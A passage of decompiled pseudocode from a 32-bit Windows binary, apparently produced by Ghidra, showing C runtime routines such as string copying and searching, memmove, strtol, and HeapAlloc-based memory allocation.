      puVar5 = (uint *)((int)puVar5 + 1);
      goto LAB_0045cc01;
    }
    if ((uVar4 & 0xff0000) == 0) {
      puVar5 = (uint *)((int)puVar5 + 2);
      goto LAB_0045cc01;
    }
  } while ((uVar4 & 0xff000000) != 0);
LAB_0045cbef:
  puVar5 = (uint *)((int)puVar3 + -1);
LAB_0045cc01:
  uVar4 = (uint)param_2 & 3;
  while (uVar4 != 0) {
    bVar1 = *(byte *)param_2;
    uVar4 = (uint)bVar1;
    param_2 = (uint *)((int)param_2 + 1);
    if (bVar1 == 0) goto LAB_0045cc78;
    *(byte *)puVar5 = bVar1;
    puVar5 = (uint *)((int)puVar5 + 1);
    uVar4 = (uint)param_2 & 3;
  }
  do {
    uVar2 = *param_2;
    uVar4 = *param_2;
    param_2 = param_2 + 1;
    if (((uVar2 ^ 0xffffffff ^ uVar2 + 0x7efefeff) & 0x81010100) != 0) {
      if ((char)uVar4 == '\0') {
LAB_0045cc78:
        *(byte *)puVar5 = (byte)uVar4;
        return param_1;
      }
      if ((char)(uVar4 >> 8) == '\0') {
        *(short *)puVar5 = (short)uVar4;
        return param_1;
      }
      if ((uVar4 & 0xff0000) == 0) {
        *(short *)puVar5 = (short)uVar4;
        *(byte *)((int)puVar5 + 2) = 0;
        return param_1;
      }
      if ((uVar4 & 0xff000000) == 0) {
        *puVar5 = uVar4;
        return param_1;
      }
    }
    *puVar5 = uVar4;
    puVar5 = puVar5 + 1;
  } while( true );
}



void __cdecl FUN_0045cc80(uint *param_1)

{
  FUN_0045cc92(param_1,DAT_0045f68c);
  return;
}



int __cdecl FUN_0045cc92(uint *param_1,int param_2)

{
  int iVar1;
  
  if (param_1 < (uint *)0xffffffe1) {
    do {
      iVar1 = FUN_0045ccbe(param_1);
      if (iVar1 != 0) {
        return iVar1;
      }
      if (param_2 == 0) {
        return 0;
      }
      iVar1 = FUN_0045ea26(param_1);
    } while (iVar1 != 0);
  }
  return 0;
}



void __cdecl FUN_0045ccbe(uint *param_1)

{
  int *piVar1;
  uint *puVar2;
  uint dwBytes;
  undefined4 *unaff_FS_OFFSET;
  undefined4 local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &DAT_0045a6c0;
  puStack_10 = &LAB_0045c368;
  local_14 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &local_14;
  if (DAT_0045fa2c == 3) {
    if (param_1 <= DAT_0045f800) {
      FUN_0045c5f5(9);
      local_8 = 0;
      piVar1 = FUN_0045da2b(param_1);
      local_8 = 0xffffffff;
      FUN_0045cd25();
      if (piVar1 != (int *)0x0) goto LAB_0045cdab;
    }
LAB_0045cd8d:
    if (param_1 == (uint *)0x0) {
      param_1 = (uint *)0x1;
    }
    dwBytes = (int)param_1 + 0xfU & 0xfffffff0;
  }
  else {
    if (DAT_0045fa2c != 2) goto LAB_0045cd8d;
    if (param_1 == (uint *)0x0) {
      dwBytes = 0x10;
    }
    else {
      dwBytes = (int)param_1 + 0xfU & 0xfffffff0;
    }
    if (dwBytes <= DAT_00459ca4) {
      FUN_0045c5f5(9);
      local_8 = 1;
      puVar2 = FUN_0045e1d8((int *)(dwBytes >> 4));
      local_8 = 0xffffffff;
      FUN_0045cd84();
      if (puVar2 != (uint *)0x0) goto LAB_0045cdab;
    }
  }
  HeapAlloc(DAT_0045fa28,0,dwBytes);
LAB_0045cdab:
  *unaff_FS_OFFSET = local_14;
  return;
}



void FUN_0045cd25(void)

{
  FUN_0045c656(9);
  return;
}



void FUN_0045cd84(void)

{
  FUN_0045c656(9);
  return;
}



char * __cdecl FUN_0045cdc0(uint *param_1)

{
  char cVar1;
  uint uVar2;
  uint *puVar3;
  uint *puVar4;
  
  uVar2 = (uint)param_1 & 3;
  puVar3 = param_1;
  while (uVar2 != 0) {
    cVar1 = *(char *)puVar3;
    puVar3 = (uint *)((int)puVar3 + 1);
    if (cVar1 == '\0') goto LAB_0045ce13;
    uVar2 = (uint)puVar3 & 3;
  }
  do {
    do {
      puVar4 = puVar3;
      puVar3 = puVar4 + 1;
    } while (((*puVar4 ^ 0xffffffff ^ *puVar4 + 0x7efefeff) & 0x81010100) == 0);
    uVar2 = *puVar4;
    if ((char)uVar2 == '\0') {
      return (char *)((int)puVar4 - (int)param_1);
    }
    if ((char)(uVar2 >> 8) == '\0') {
      return (char *)((int)puVar4 + (1 - (int)param_1));
    }
    if ((uVar2 & 0xff0000) == 0) {
      return (char *)((int)puVar4 + (2 - (int)param_1));
    }
  } while ((uVar2 & 0xff000000) != 0);
LAB_0045ce13:
  return (char *)((int)puVar3 + (-1 - (int)param_1));
}



undefined4 * __cdecl FUN_0045ce40(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  uint uVar1;
  uint uVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  
  if ((param_2 < param_1) && (param_1 < (undefined4 *)(param_3 + (int)param_2))) {
    puVar3 = (undefined4 *)((param_3 - 4) + (int)param_2);
    puVar4 = (undefined4 *)((param_3 - 4) + (int)param_1);
    if (((uint)puVar4 & 3) == 0) {
      uVar1 = param_3 >> 2;
      uVar2 = param_3 & 3;
      if (7 < uVar1) {
        for (; uVar1 != 0; uVar1 = uVar1 - 1) {
          *puVar4 = *puVar3;
          puVar3 = puVar3 + -1;
          puVar4 = puVar4 + -1;
        }
        switch(uVar2) {
        case 0:
          return param_1;
        case 2:
          goto switchD_0045cff7_caseD_2;
        case 3:
          goto switchD_0045cff7_caseD_3;
        }
        goto switchD_0045cff7_caseD_1;
      }
    }
    else {
      switch(param_3) {
      case 0:
        goto switchD_0045cff7_caseD_0;
      case 1:
        goto switchD_0045cff7_caseD_1;
      case 2:
        goto switchD_0045cff7_caseD_2;
      case 3:
        goto switchD_0045cff7_caseD_3;
      default:
        uVar1 = param_3 - ((uint)puVar4 & 3);
        switch((uint)puVar4 & 3) {
        case 1:
          uVar2 = uVar1 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar3 + 3);
          puVar3 = (undefined4 *)((int)puVar3 + -1);
          uVar1 = uVar1 >> 2;
          puVar4 = (undefined4 *)((int)puVar4 - 1);
          if (7 < uVar1) {
            for (; uVar1 != 0; uVar1 = uVar1 - 1) {
              *puVar4 = *puVar3;
              puVar3 = puVar3 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar2) {
            case 0:
              return param_1;
            case 2:
              goto switchD_0045cff7_caseD_2;
            case 3:
              goto switchD_0045cff7_caseD_3;
            }
            goto switchD_0045cff7_caseD_1;
          }
          break;
        case 2:
          uVar2 = uVar1 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar3 + 3);
          uVar1 = uVar1 >> 2;
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar3 + 2);
          puVar3 = (undefined4 *)((int)puVar3 + -2);
          puVar4 = (undefined4 *)((int)puVar4 - 2);
          if (7 < uVar1) {
            for (; uVar1 != 0; uVar1 = uVar1 - 1) {
              *puVar4 = *puVar3;
              puVar3 = puVar3 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar2) {
            case 0:
              return param_1;
            case 2:
              goto switchD_0045cff7_caseD_2;
            case 3:
              goto switchD_0045cff7_caseD_3;
            }
            goto switchD_0045cff7_caseD_1;
          }
          break;
        case 3:
          uVar2 = uVar1 & 3;
          *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar3 + 3);
          *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar3 + 2);
          uVar1 = uVar1 >> 2;
          *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar3 + 1);
          puVar3 = (undefined4 *)((int)puVar3 + -3);
          puVar4 = (undefined4 *)((int)puVar4 - 3);
          if (7 < uVar1) {
            for (; uVar1 != 0; uVar1 = uVar1 - 1) {
              *puVar4 = *puVar3;
              puVar3 = puVar3 + -1;
              puVar4 = puVar4 + -1;
            }
            switch(uVar2) {
            case 0:
              return param_1;
            case 2:
              goto switchD_0045cff7_caseD_2;
            case 3:
              goto switchD_0045cff7_caseD_3;
            }
            goto switchD_0045cff7_caseD_1;
          }
        }
      }
    }
    switch(uVar1) {
    case 7:
      puVar4[7 - uVar1] = puVar3[7 - uVar1];
    case 6:
      puVar4[6 - uVar1] = puVar3[6 - uVar1];
    case 5:
      puVar4[5 - uVar1] = puVar3[5 - uVar1];
    case 4:
      puVar4[4 - uVar1] = puVar3[4 - uVar1];
    case 3:
      puVar4[3 - uVar1] = puVar3[3 - uVar1];
    case 2:
      puVar4[2 - uVar1] = puVar3[2 - uVar1];
    case 1:
      puVar4[1 - uVar1] = puVar3[1 - uVar1];
      puVar3 = puVar3 + -uVar1;
      puVar4 = puVar4 + -uVar1;
    }
    switch(uVar2) {
    case 1:
switchD_0045cff7_caseD_1:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar3 + 3);
      return param_1;
    case 2:
switchD_0045cff7_caseD_2:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar3 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar3 + 2);
      return param_1;
    case 3:
switchD_0045cff7_caseD_3:
      *(undefined *)((int)puVar4 + 3) = *(undefined *)((int)puVar3 + 3);
      *(undefined *)((int)puVar4 + 2) = *(undefined *)((int)puVar3 + 2);
      *(undefined *)((int)puVar4 + 1) = *(undefined *)((int)puVar3 + 1);
      return param_1;
    }
switchD_0045cff7_caseD_0:
    return param_1;
  }
  puVar3 = param_1;
  if (((uint)param_1 & 3) == 0) {
    uVar1 = param_3 >> 2;
    uVar2 = param_3 & 3;
    if (7 < uVar1) {
      for (; uVar1 != 0; uVar1 = uVar1 - 1) {
        *puVar3 = *param_2;
        param_2 = param_2 + 1;
        puVar3 = puVar3 + 1;
      }
      switch(uVar2) {
      case 0:
        return param_1;
      case 2:
        goto switchD_0045ce75_caseD_2;
      case 3:
        goto switchD_0045ce75_caseD_3;
      }
      goto switchD_0045ce75_caseD_1;
    }
  }
  else {
    switch(param_3) {
    case 0:
      goto switchD_0045ce75_caseD_0;
    case 1:
      goto switchD_0045ce75_caseD_1;
    case 2:
      goto switchD_0045ce75_caseD_2;
    case 3:
      goto switchD_0045ce75_caseD_3;
    default:
      uVar1 = (param_3 - 4) + ((uint)param_1 & 3);
      switch((uint)param_1 & 3) {
      case 1:
        uVar2 = uVar1 & 3;
        *(undefined *)param_1 = *(undefined *)param_2;
        *(undefined *)((int)param_1 + 1) = *(undefined *)((int)param_2 + 1);
        uVar1 = uVar1 >> 2;
        *(undefined *)((int)param_1 + 2) = *(undefined *)((int)param_2 + 2);
        param_2 = (undefined4 *)((int)param_2 + 3);
        puVar3 = (undefined4 *)((int)param_1 + 3);
        if (7 < uVar1) {
          for (; uVar1 != 0; uVar1 = uVar1 - 1) {
            *puVar3 = *param_2;
            param_2 = param_2 + 1;
            puVar3 = puVar3 + 1;
          }
          switch(uVar2) {
          case 0:
            return param_1;
          case 2:
            goto switchD_0045ce75_caseD_2;
          case 3:
            goto switchD_0045ce75_caseD_3;
          }
          goto switchD_0045ce75_caseD_1;
        }
        break;
      case 2:
        uVar2 = uVar1 & 3;
        *(undefined *)param_1 = *(undefined *)param_2;
        uVar1 = uVar1 >> 2;
        *(undefined *)((int)param_1 + 1) = *(undefined *)((int)param_2 + 1);
        param_2 = (undefined4 *)((int)param_2 + 2);
        puVar3 = (undefined4 *)((int)param_1 + 2);
        if (7 < uVar1) {
          for (; uVar1 != 0; uVar1 = uVar1 - 1) {
            *puVar3 = *param_2;
            param_2 = param_2 + 1;
            puVar3 = puVar3 + 1;
          }
          switch(uVar2) {
          case 0:
            return param_1;
          case 2:
            goto switchD_0045ce75_caseD_2;
          case 3:
            goto switchD_0045ce75_caseD_3;
          }
          goto switchD_0045ce75_caseD_1;
        }
        break;
      case 3:
        uVar2 = uVar1 & 3;
        *(undefined *)param_1 = *(undefined *)param_2;
        param_2 = (undefined4 *)((int)param_2 + 1);
        uVar1 = uVar1 >> 2;
        puVar3 = (undefined4 *)((int)param_1 + 1);
        if (7 < uVar1) {
          for (; uVar1 != 0; uVar1 = uVar1 - 1) {
            *puVar3 = *param_2;
            param_2 = param_2 + 1;
            puVar3 = puVar3 + 1;
          }
          switch(uVar2) {
          case 0:
            return param_1;
          case 2:
            goto switchD_0045ce75_caseD_2;
          case 3:
            goto switchD_0045ce75_caseD_3;
          }
          goto switchD_0045ce75_caseD_1;
        }
      }
    }
  }
                    // WARNING: Could not find normalized switch variable to match jumptable
  switch(uVar1) {
  case 0x1c:
  case 0x1d:
  case 0x1e:
  case 0x1f:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar3[uVar1 - 7] = param_2[uVar1 - 7];
  case 0x18:
  case 0x19:
  case 0x1a:
  case 0x1b:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar3[uVar1 - 6] = param_2[uVar1 - 6];
  case 0x14:
  case 0x15:
  case 0x16:
  case 0x17:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar3[uVar1 - 5] = param_2[uVar1 - 5];
  case 0x10:
  case 0x11:
  case 0x12:
  case 0x13:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar3[uVar1 - 4] = param_2[uVar1 - 4];
  case 0xc:
  case 0xd:
  case 0xe:
  case 0xf:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar3[uVar1 - 3] = param_2[uVar1 - 3];
  case 8:
  case 9:
  case 10:
  case 0xb:
                    // WARNING: This code block may not be properly labeled as switch case
    puVar3[uVar1 - 2] = param_2[uVar1 - 2];
  case 4:
  case 5:
  case 6:
  case 7:
    puVar3[uVar1 - 1] = param_2[uVar1 - 1];
    param_2 = param_2 + uVar1;
    puVar3 = puVar3 + uVar1;
  }
  switch(uVar2) {
  case 1:
switchD_0045ce75_caseD_1:
    *(undefined *)puVar3 = *(undefined *)param_2;
    return param_1;
  case 2:
switchD_0045ce75_caseD_2:
    *(undefined *)puVar3 = *(undefined *)param_2;
    *(undefined *)((int)puVar3 + 1) = *(undefined *)((int)param_2 + 1);
    return param_1;
  case 3:
switchD_0045ce75_caseD_3:
    *(undefined *)puVar3 = *(undefined *)param_2;
    *(undefined *)((int)puVar3 + 1) = *(undefined *)((int)param_2 + 1);
    *(undefined *)((int)puVar3 + 2) = *(undefined *)((int)param_2 + 2);
    return param_1;
  }
switchD_0045ce75_caseD_0:
  return param_1;
}



uint * __cdecl FUN_0045d175(int param_1,int param_2)

{
  int iVar1;
  uint *puVar2;
  uint *puVar3;
  undefined4 *unaff_FS_OFFSET;
  uint *puVar4;
  uint *local_24;
  undefined4 local_14;
  undefined *puStack_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &DAT_0045a6d8;
  puStack_10 = &LAB_0045c368;
  local_14 = *unaff_FS_OFFSET;
  *unaff_FS_OFFSET = &local_14;
  puVar2 = (uint *)(param_1 * param_2);
  puVar3 = puVar2;
  if (puVar2 < (uint *)0xffffffe1) {
    if (puVar2 == (uint *)0x0) {
      puVar3 = (uint *)0x1;
    }
    puVar3 = (uint *)((int)puVar3 + 0xfU & 0xfffffff0);
  }
  do {
    local_24 = (uint *)0x0;
    if (puVar3 < (uint *)0xffffffe1) {
      if (DAT_0045fa2c == 3) {
        if (puVar2 <= DAT_0045f800) {
          FUN_0045c5f5(9);
          local_8 = 0;
          local_24 = (uint *)FUN_0045da2b(puVar2);
          local_8 = 0xffffffff;
          FUN_0045d20e();
          puVar4 = puVar2;
          if (local_24 == (uint *)0x0) goto LAB_0045d262;
LAB_0045d251:
          FUN_0045ea50(local_24,0,(uint)puVar4);
        }
LAB_0045d25d:
        if (local_24 != (uint *)0x0) goto LAB_0045d2a3;
      }
      else {
        if ((DAT_0045fa2c != 2) || (DAT_00459ca4 < puVar3)) goto LAB_0045d25d;
        FUN_0045c5f5(9);
        local_8 = 1;
        local_24 = FUN_0045e1d8((int *)((uint)puVar3 >> 4));
        local_8 = 0xffffffff;
        FUN_0045d297();
        puVar4 = puVar3;
        if (local_24 != (uint *)0x0) goto LAB_0045d251;
      }
LAB_0045d262:
      local_24 = (uint *)HeapAlloc(DAT_0045fa28,8,(SIZE_T)puVar3);
    }
    if ((local_24 != (uint *)0x0) || (DAT_0045f68c == 0)) goto LAB_0045d2a3;
    iVar1 = FUN_0045ea26(puVar3);
  } while (iVar1 != 0);
  local_24 = (uint *)0x0;
LAB_0045d2a3:
  *unaff_FS_OFFSET = local_14;
  return local_24;
}



void FUN_0045d20e(void)

{
  FUN_0045c656(9);
  return;
}



void FUN_0045d297(void)

{
  FUN_0045c656(9);
  return;
}



void __thiscall FUN_0045d2b2(void *this,byte *param_1,byte **param_2,void *param_3)

{
  FUN_0045d2c9(this,param_1,param_2,param_3,0);
  return;
}



void * __thiscall FUN_0045d2c9(void *this,byte *param_1,byte **param_2,void *param_3,uint param_4)

{
  void *pvVar1;
  uint uVar2;
  void *pvVar3;
  uint uVar4;
  uint *puVar5;
  void *this_00;
  byte bVar6;
  undefined *puVar7;
  void *local_c;
  byte *local_8;
  
  local_c = (void *)0x0;
  bVar6 = *param_1;
  local_8 = param_1 + 1;
  while( true ) {
    if (DAT_0045a028 < 2) {
      uVar2 = (byte)PTR_DAT_00459cb0[(uint)bVar6 * 2] & 8;
      this = PTR_DAT_00459cb0;
    }
    else {
      puVar7 = (undefined *)0x8;
      uVar2 = FUN_0045ebec(this,(uint)bVar6,8);
      this = puVar7;
    }
    if (uVar2 == 0) break;
    bVar6 = *local_8;
    local_8 = local_8 + 1;
  }
  if (bVar6 == 0x2d) {
    param_4 = param_4 | 2;
LAB_0045d324:
    bVar6 = *local_8;
    local_8 = local_8 + 1;
  }
  else if (bVar6 == 0x2b) goto LAB_0045d324;
  if ((((int)param_3 < 0) || (param_3 == (void *)0x1)) || (0x24 < (int)param_3)) {
    if (param_2 != (byte **)0x0) {
      *param_2 = param_1;
    }
    return (void *)0x0;
  }
  this_00 = (void *)0x10;
  if (param_3 == (void *)0x0) {
    if (bVar6 != 0x30) {
      param_3 = (void *)0xa;
      goto LAB_0045d38e;
    }
    if ((*local_8 != 0x78) && (*local_8 != 0x58)) {
      param_3 = (void *)0x8;
      goto LAB_0045d38e;
    }
    param_3 = (void *)0x10;
  }
  if (((param_3 == (void *)0x10) && (bVar6 == 0x30)) && ((*local_8 == 0x78 || (*local_8 == 0x58))))
  {
    bVar6 = local_8[1];
    local_8 = local_8 + 2;
  }
LAB_0045d38e:
  pvVar3 = (void *)(0xffffffff / ZEXT48(param_3));
  do {
    uVar2 = (uint)bVar6;
    if (DAT_0045a028 < 2) {
      uVar4 = (byte)PTR_DAT_00459cb0[uVar2 * 2] & 4;
    }
    else {
      pvVar1 = (void *)0x4;
      uVar4 = FUN_0045ebec(this_00,uVar2,4);
      this_00 = pvVar1;
    }
    if (uVar4 == 0) {
      if (DAT_0045a028 < 2) {
        uVar2 = *(ushort *)(PTR_DAT_00459cb0 + uVar2 * 2) & 0x103;
      }
      else {
        uVar2 = FUN_0045ebec(this_00,uVar2,0x103);
      }
      if (uVar2 == 0) {
LAB_0045d43a:
        local_8 = local_8 + -1;
        if ((param_4 & 8) == 0) {
          if (param_2 != (byte **)0x0) {
            local_8 = param_1;
          }
          local_c = (void *)0x0;
        }
        else if (((param_4 & 4) != 0) ||
                (((param_4 & 1) == 0 &&
                 ((((param_4 & 2) != 0 && ((void *)0x80000000 < local_c)) ||
                  (((param_4 & 2) == 0 && ((void *)0x7fffffff < local_c)))))))) {
          puVar5 = FUN_0045eaa8();
          *puVar5 = 0x22;
          if ((param_4 & 1) == 0) {
            local_c = (void *)(((param_4 & 2) != 0) + 0x7fffffff);
          }
          else {
            local_c = (void *)0xffffffff;
          }
        }
        if (param_2 != (byte **)0x0) {
          *param_2 = local_8;
        }
        if ((param_4 & 2) == 0) {
          return local_c;
        }
        return (void *)-(int)local_c;
      }
      uVar2 = FUN_0045eab1((int)(char)bVar6);
      this_00 = (void *)(uVar2 - 0x37);
    }
    else {
      this_00 = (void *)((char)bVar6 + -0x30);
    }
    if (param_3 <= this_00) goto LAB_0045d43a;
    if ((local_c < pvVar3) ||
       ((local_c == pvVar3 && (this_00 <= (void *)(0xffffffff % ZEXT48(param_3)))))) {
      local_c = (void *)((int)local_c * (int)param_3 + (int)this_00);
      param_4 = param_4 | 8;
    }
    else {
      param_4 = param_4 | 0xc;
    }
    bVar6 = *local_8;
    local_8 = local_8 + 1;
  } while( true );
}



uint * __cdecl FUN_0045d4e0(uint *param_1,char param_2)

{
  uint uVar1;
  char cVar2;
  uint uVar3;
  uint uVar4;
  uint *puVar5;
  
  uVar1 = (uint)param_1 & 3;
  while (uVar1 != 0) {
    if (*(char *)param_1 == param_2) {
      return param_1;
    }
    if (*(char *)param_1 == '\0') {
      return (uint *)0x0;
    }
    uVar1 = (uint)(uint *)((int)param_1 + 1) & 3;
    param_1 = (uint *)((int)param_1 + 1);
  }
  while( true ) {
    while( true ) {
      uVar1 = *param_1;
      uVar4 = uVar1 ^ CONCAT22(CONCAT11(param_2,param_2),CONCAT11(param_2,param_2));
      uVar3 = uVar1 ^ 0xffffffff ^ uVar1 + 0x7efefeff;
      puVar5 = param_1 + 1;
      if (((uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff) & 0x81010100) != 0) break;
      param_1 = puVar5;
      if ((uVar3 & 0x81010100) != 0) {
        if ((uVar3 & 0x1010100) != 0) {
          return (uint *)0x0;
        }
        if ((uVar1 + 0x7efefeff & 0x80000000) == 0) {
          return (uint *)0x0;
        }
      }
    }
    uVar1 = *param_1;
    if ((char)uVar1 == param_2) {
      return param_1;
    }
    if ((char)uVar1 == '\0') {
      return (uint *)0x0;
    }
    cVar2 = (char)(uVar1 >> 8);
    if (cVar2 == param_2) {
      return (uint *)((int)param_1 + 1);
    }
    if (cVar2 == '\0') break;
    cVar2 = (char)(uVar1 >> 0x10);
    if (cVar2 == param_2) {
      return (uint *)((int)param_1 + 2);
    }
    if (cVar2 == '\0') {
      return (uint *)0x0;
    }
    cVar2 = (char)(uVar1 >> 0x18);
    if (cVar2 == param_2) {
      return (uint *)((int)param_1 + 3);
    }
    param_1 = puVar5;
    if (cVar2 == '\0') {
      return (uint *)0x0;
    }
  }
  return (uint *)0x0;
}



uint * __cdecl FUN_0045d5a0(uint *param_1,char *param_2)

{
  char *pcVar1;
  char *pcVar2;
  char cVar3;
  uint uVar4;
  uint *puVar5;
  char cVar6;
  uint uVar7;
  uint uVar8;
  char *pcVar9;
  uint *puVar10;
  
  cVar3 = *param_2;
  if (cVar3 == '\0') {
    return param_1;
  }
  if (param_2[1] == '\0') {
    uVar4 = (uint)param_1 & 3;
    while (uVar4 != 0) {
      if (*(char *)param_1 == cVar3) {
        return param_1;
      }
      if (*(char *)param_1 == '\0') {
        return (uint *)0x0;
      }
      uVar4 = (uint)(uint *)((int)param_1 + 1) & 3;
      param_1 = (uint *)((int)param_1 + 1);
    }
    while( true ) {
      while( true ) {
        uVar4 = *param_1;
        uVar8 = uVar4 ^ CONCAT22(CONCAT11(cVar3,cVar3),CONCAT11(cVar3,cVar3));
        uVar7 = uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff;
        puVar10 = param_1 + 1;
        if (((uVar8 ^ 0xffffffff ^ uVar8 + 0x7efefeff) & 0x81010100) != 0) break;
        param_1 = puVar10;
        if ((uVar7 & 0x81010100) != 0) {
          if ((uVar7 & 0x1010100) != 0) {
            return (uint *)0x0;
          }
          if ((uVar4 + 0x7efefeff & 0x80000000) == 0) {
            return (uint *)0x0;
          }
        }
      }
      uVar4 = *param_1;
      if ((char)uVar4 == cVar3) {
        return param_1;
      }
      if ((char)uVar4 == '\0') {
        return (uint *)0x0;
      }
      cVar6 = (char)(uVar4 >> 8);
      if (cVar6 == cVar3) {
        return (uint *)((int)param_1 + 1);
      }
      if (cVar6 == '\0') break;
      cVar6 = (char)(uVar4 >> 0x10);
      if (cVar6 == cVar3) {
        return (uint *)((int)param_1 + 2);
      }
      if (cVar6 == '\0') {
        return (uint *)0x0;
      }
      cVar6 = (char)(uVar4 >> 0x18);
      if (cVar6 == cVar3) {
        return (uint *)((int)param_1 + 3);
      }
      param_1 = puVar10;
      if (cVar6 == '\0') {
        return (uint *)0x0;
      }
    }
    return (uint *)0x0;
  }
  do {
    cVar6 = *(char *)param_1;
    do {
      while (puVar10 = param_1, param_1 = (uint *)((int)puVar10 + 1), cVar6 != cVar3) {
        if (cVar6 == '\0') {
          return (uint *)0x0;
        }
        cVar6 = *(char *)param_1;
      }
      cVar6 = *(char *)param_1;
      pcVar9 = param_2;
      puVar5 = puVar10;
    } while (cVar6 != param_2[1]);
    do {
      if (pcVar9[2] == '\0') {
        return puVar10;
      }
      if (*(char *)(uint *)((int)puVar5 + 2) != pcVar9[2]) break;
      pcVar1 = pcVar9 + 3;
      if (*pcVar1 == '\0') {
        return puVar10;
      }
      pcVar2 = (char *)((int)puVar5 + 3);
      pcVar9 = pcVar9 + 2;
      puVar5 = (uint *)((int)puVar5 + 2);
    } while (*pcVar1 == *pcVar2);
  } while( true );
}



uint __cdecl FUN_0045d620(char *param_1,char *param_2,uint param_3)

{
  char cVar1;
  char cVar2;
  uint uVar3;
  int iVar4;
  char *pcVar5;
  char *pcVar6;
  
  uVar3 = param_3;
  pcVar5 = param_1;
  if (param_3 != 0) {
    do {
      if (uVar3 == 0) break;
      uVar3 = uVar3 - 1;
      cVar1 = *pcVar5;
      pcVar5 = pcVar5 + 1;
    } while (cVar1 != '\0');
    iVar4 = param_3 - uVar3;
    do {
      pcVar5 = param_2;
      pcVar6 = param_1;
      if (iVar4 == 0) break;
      iVar4 = iVar4 + -1;
      pcVar6 = param_1 + 1;
      pcVar5 = param_2 + 1;
      cVar2 = *param_1;
      cVar1 = *param_2;
      param_2 = pcVar5;
      param_1 = pcVar6;
    } while (cVar1 == cVar2);
    uVar3 = 0;
    if ((byte)pcVar5[-1] <= (byte)pcVar6[-1]) {
      if (pcVar5[-1] == pcVar6[-1]) {
        return 0;
      }
      uVar3 = 0xfffffffe;
    }
    param_3 = ~uVar3;
  }
  return param_3;
}



// WARNING: Unable to track spacebase fully for stack

void FUN_0045d660(undefined1 param_1)

{
  uint in_EAX;
  undefined1 *puVar1;
  undefined4 unaff_retaddr;
  
  puVar1 = &param_1;
  if (0xfff < in_EAX) {
    do {
      puVar1 = puVar1 + -0x1000;
      in_EAX = in_EAX - 0x1000;
    } while (0xfff < in_EAX);
  }
  *(undefined4 *)(puVar1 + (-4 - in_EAX)) = unaff_retaddr;
  return;
}



undefined4 __cdecl FUN_0045d68f(undefined4 param_1)

{
  DAT_0045f7fc = HeapAlloc(DAT_0045fa28,0,0x140);
  if (DAT_0045f7fc == (LPVOID)0x0) {
    return 0;
  }
  DAT_0045f7f4 = 0;
  DAT_0045f7f8 = 0;
  DAT_0045f7f0 = DAT_0045f7fc;
  DAT_0045f800 = param_1;
  DAT_0045f7e8 = 0x10;
  return 1;
}



uint __cdecl FUN_0045d6d7(int param_1)

{
  uint uVar1;
  
  uVar1 = DAT_0045f7fc;
  while( true ) {
    if (DAT_0045f7fc + DAT_0045f7f8 * 0x14 <= uVar1) {
      return 0;
    }
    if ((uint)(param_1 - *(int *)(uVar1 + 0xc)) < 0x100000) break;
    uVar1 = uVar1 + 0x14;
  }
  return uVar1;
}



void __cdecl FUN_0045d702(uint *param_1,int param_2)

{
  char *pcVar1;
  uint *puVar2;
  int *piVar3;
  char cVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  byte bVar8;
  uint uVar9;
  uint *puVar10;
  uint *puVar11;
  uint *puVar12;
  uint uVar13;
  uint uVar14;
  uint local_8;
  
  uVar5 = param_1[4];
  puVar12 = (uint *)(param_2 + -4);
  uVar14 = param_2 - param_1[3] >> 0xf;
  piVar3 = (int *)(uVar14 * 0x204 + 0x144 + uVar5);
  uVar13 = *puVar12;
  local_8 = uVar13 - 1;
  if ((local_8 & 1) == 0) {
    uVar6 = *(uint *)(local_8 + (int)puVar12);
    uVar7 = *(uint *)(param_2 + -8);
    if ((uVar6 & 1) == 0) {
      uVar9 = ((int)uVar6 >> 4) - 1;
      if (0x3f < uVar9) {
        uVar9 = 0x3f;
      }
      if (*(int *)((int)puVar12 + uVar13 + 3) == *(int *)((int)puVar12 + uVar13 + 7)) {
        if (uVar9 < 0x20) {
          pcVar1 = (char *)(uVar9 + 4 + uVar5);
          uVar9 = ~(0x80000000U >> ((byte)uVar9 & 0x1f));
          puVar10 = (uint *)(uVar5 + 0x44 + uVar14 * 4);
          *puVar10 = *puVar10 & uVar9;
          *pcVar1 = *pcVar1 + -1;
          if (*pcVar1 == '\0') {
            *param_1 = *param_1 & uVar9;
          }
        }
        else {
          pcVar1 = (char *)(uVar9 + 4 + uVar5);
          uVar9 = ~(0x80000000U >> ((byte)uVar9 - 0x20 & 0x1f));
          puVar10 = (uint *)(uVar5 + 0xc4 + uVar14 * 4);
          *puVar10 = *puVar10 & uVar9;
          *pcVar1 = *pcVar1 + -1;
          if (*pcVar1 == '\0') {
            param_1[1] = param_1[1] & uVar9;
          }
        }
      }
      local_8 = local_8 + uVar6;
      *(undefined4 *)(*(int *)((int)puVar12 + uVar13 + 7) + 4) =
           *(undefined4 *)((int)puVar12 + uVar13 + 3);
      *(undefined4 *)(*(int *)((int)puVar12 + uVar13 + 3) + 8) =
           *(undefined4 *)((int)puVar12 + uVar13 + 7);
    }
    puVar10 = (uint *)(((int)local_8 >> 4) - 1);
    if ((uint *)0x3f < puVar10) {
      puVar10 = (uint *)0x3f;
    }
    puVar11 = param_1;
    if ((uVar7 & 1) == 0) {
